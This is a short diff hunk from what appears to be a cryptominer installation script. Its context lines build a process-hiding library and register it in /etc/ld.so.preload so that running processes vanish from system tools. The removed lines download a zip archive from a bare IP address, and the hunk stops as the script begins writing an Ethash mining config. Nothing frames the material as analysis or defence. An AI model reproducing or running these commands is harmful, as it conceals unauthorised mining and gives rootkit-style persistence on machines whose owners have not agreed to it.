@@ -11,8 +11,6 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-wget http://148.100.79.31/nanom.zip
-unzip nanom.zip
 
 cat > config_eth.ini <<END
 [Ethash]
